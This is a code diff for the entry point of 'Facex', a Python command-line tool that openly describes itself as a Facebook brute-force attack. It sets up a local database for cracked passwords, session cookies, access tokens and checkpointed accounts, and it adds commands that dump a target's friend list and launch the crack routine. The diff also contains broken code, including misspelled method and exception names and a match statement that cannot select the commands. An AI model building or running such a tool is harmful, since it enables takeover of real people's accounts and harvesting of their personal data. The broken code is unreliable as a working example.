@@ -1,53 +1,43 @@
-import argparse, sqlite3
-from . import config, scrape_token, Facex
+#!/usr/bin/env python3
+import argparse, os, sys, sqlite3
+from . import Facebook
+
+DB_DIR = os.path.expanduser('~/.facex')
+DB_NAME = os.path.join(DB_DIR, 'database.db')
+
+if not os.path.exists(DB_DIR):
+    os.makedirs(DB_DIR)
+    print(DB_DIR)
 
 def main():
-    arg = argparse.ArgumentParser(description='Beautiful Facebook Bruteforce Attack.')
-    sub = arg.add_subparsers(title='command', dest='command', required=True)
+    with sqlite3.connect(DB_NAME) as db:
+        cursor = db.cursor()
+        cursor.execute('CREATE TABLE IF NOT EXISTS cache (id TEXT UNIQUE)')
+        cursor.execute('CREATE TABLE IF NOT EXISTS checkpoint (id TEXT UNIQUE NOT NULL, password TEXT, cookie TEXT, useragents TEXT)')
+        cursor.execute('CREATE TABLE IF NOT EXISTS success (id TEXT UNIQUE NOT NULL, password TEXT, cookie TEXT, useragents TEXT)')
+        cursor.execute('CREATE TABLE IF NOT EXISTS dump (id TEXT UNIQUE NOT NULL, name TEXT)')
+        cursor.execute('CREATE TABLE IF NOT EXISTS user (cookie TEXT, token TEXT)')
+        cursor.execute('CREATE TABLE IF NOT EXISTS useragents (ua TEXT)')
+        db.commit()
 
-    useragent = sub.add_parser('set', help='Setup')
-    useragent.add_argument('-ua', '--useragents', help='Set useragents to the database for Bruteforce Attack. set None for use random')
-    useragent.add_argument('-c', '--cookie', help='Set cookie and tokeb to the database.')
+    parser = argparse.ArgumentParser(prog='Facex', description='Facebook bruteforce attack using python cli.', epilog='Nyett')
+    action = parser.add_subparserd(title='Action', dest='Action', required=True)
 
-    dump = sub.add_parser('dump', help='Dump id and name from friendlist.')
-    dump.add_argument('-t', '--target', type=str, help='Set target for dump <-t <1000xxxxx>>')
-    #dump.add_argument('-l', '--limit', type=int, help='Set limit for dump <-l <5000>>')
+    dump = action.add_parser('dump')
+    dump.add_argument('-t', '--target', help='Facebook id for get list friends.')
 
-    parse = arg.parse_args()
-    match parse.command:
-        case 'set':
-            if parse.useragents:
-                with sqlite3.connect(config.DB_PATH) as db:
-                    cursor = db.cursor()
-                    cursor.execute('DELETE FROM useragents')
-                    cursor.execute('INSERT INTO useragents (ua) VALUES (?)', (parse.useragents,))
+    run = action.add_parser('run')
 
-                    db.commit()
-
-                print('\n[ INFO! ] Successfull set useragents.\nValue: '+ str(parse.useragents))
-
-            if parse.cookie:
-                with sqlite3.connect(config.DB_PATH) as db:
-                    cursor = db.cursor()
-                    cursor.execute('DELETE FROM user')
-                    
-                    token_out = scrape_token.Scrape(cookie=parse.cookie).oauth()
-                    if 'EAAB' in str(token_out):
-                        print(f'\n[ INFO! ] Successfull set cookie and token!\nCookie: {parse.cookie}\nToken: {token_out}')
-                        cursor.execute('INSERT INTO user (cookie, token) VALUES (?,?)', (parse.cookie, token_out))
-                    else:
-                        print(f'\n[ WARN! ] Faillure setup cookie and token.\nPlease use another cookie.')
-
-                    db.commit()
-
+    pars = parser.parse_args()
+    match pars:
         case 'dump':
-            obj = Facex()
-            after = [obj.dump_friends(parse.target)]
-            for i in after:
-                try:
-                    after.append(obj.dump_friends(parse.target, i))
-                except Exceptiona as e:
-                    print('[ WARN! ] '+ str(e))
-                    break
-            
+            Facebook().dump_friendlist(id=str(pars.target))
 
+        case 'run':
+            Facebook().crack()
+
+
+
+
+if __name__ == "__main__":
+    main()
